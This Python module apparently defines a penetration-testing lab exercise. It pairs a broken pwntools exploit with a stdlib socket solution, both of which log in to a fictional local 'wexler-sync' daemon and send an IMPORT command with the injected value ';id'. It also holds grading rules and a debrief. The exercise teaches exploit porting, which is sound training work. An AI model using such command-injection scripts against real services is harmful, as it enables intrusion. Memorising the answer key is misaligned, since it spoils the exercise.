"""salvage defect class 8: an import you do not have and do not need.

Exploit archives are full of scripts that pull in a framework to do something
the standard library already does. On an exam box with no internet and no
package manager, "just pip install it" is not available, and the fix is
usually twenty lines of `socket`.

The absence of `pwn` is an assumption this scenario depends on, so it is
declared in `needs_absent` and `validate.py` asserts it rather than hoping.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# wexler-sync 1.4 - IMPORT command injection
from pwn import *

HOST = "127.0.0.1"
PORT = {{PORT}}
TOKEN = "wx-8f21a3c7"

def main():
    io = remote(HOST, PORT)
    io.recvline()
    io.sendline(("AUTH " + TOKEN).encode())
    io.recvline()
    io.sendline(b"IMPORT /var/lib/wexler/jobs;id")
    reply = io.recvline().decode().strip()
    io.close()
    print("[*] reply: " + reply)
    print("[+] landed" if "CRUX-LANDED" in reply else "[-] no")

if __name__ == "__main__":
    main()
'''

SOLUTION = r'''#!/usr/bin/env python3
# wexler-sync 1.4 - IMPORT command injection (stdlib only)
import socket

HOST = "127.0.0.1"
PORT = {{PORT}}
TOKEN = "wx-8f21a3c7"

def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.recv(256)
    s.sendall(("AUTH " + TOKEN + "\n").encode())
    s.recv(256)
    s.sendall(b"IMPORT /var/lib/wexler/jobs;id\n")
    reply = s.recv(256).decode().strip()
    s.close()
    print("[*] reply: " + reply)
    print("[+] landed" if "CRUX-LANDED" in reply else "[-] no")

if __name__ == "__main__":
    main()
'''

SCENARIOS = [
    Scenario(
        id='salvage-dependency', track='salvage', tier='verified', order=80,
        title='ModuleNotFoundError, and no way to install it',
        waypoint='svc-db', hone=('python',),
        source='PEN-200 Playbook/13 - Third-Party Exam Scripts and Automation.md',
        body=SalvageBody(
            brief='The same `wexler-sync` daemon, and a proof-of-concept that '
                  'will not start. **Assume you cannot install anything**: no '
                  'internet, no package manager, exam conditions. The token '
                  'is `wx-8f21a3c7` and the daemon wants an `AUTH` line '
                  'before it will read a command.',
            filename='wexler_pwn.py',
            cve='CVE-2021-3156', models='sudo "Baron Samedit"',
            real_note=(
                'Baron Samedit and most of exploit-db ship as pwntools scripts. '
                'On an exam box with no internet and no pip, the twenty-line '
                'stdlib port is the difference between a shell and nothing.'
            ),
            defects=('imports pwntools for what socket already does',),
            kind='tcp',
            banner=b'wexler-sync 1.4 ready\n',
            needs_absent=('pwn',),
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('an AUTH line', 'raw', 'AUTH wx-8f21a3c7',
                            hint='nothing authenticated to the daemon'),
                Requirement('an IMPORT line', 'raw', 'IMPORT ',
                            hint='no IMPORT command arrived'),
                Requirement('the injection', 'raw', ';id',
                            hint='the IMPORT path carried no injected command'),
            ),
            debrief='`remote()`, `recvline()` and `sendline()` are '
                    '`socket.create_connection`, `recv` and `sendall` with a '
                    'newline. **Before you go looking for a wheel, read what '
                    'the framework is actually being used for**: in exploit '
                    'code it is very often three calls that the standard '
                    'library already has, and the port takes less time than '
                    'the first search would have. The one thing to watch is '
                    'that `sendline` adds the terminator for you and '
                    '`sendall` does not.',
        ),
    ),
]
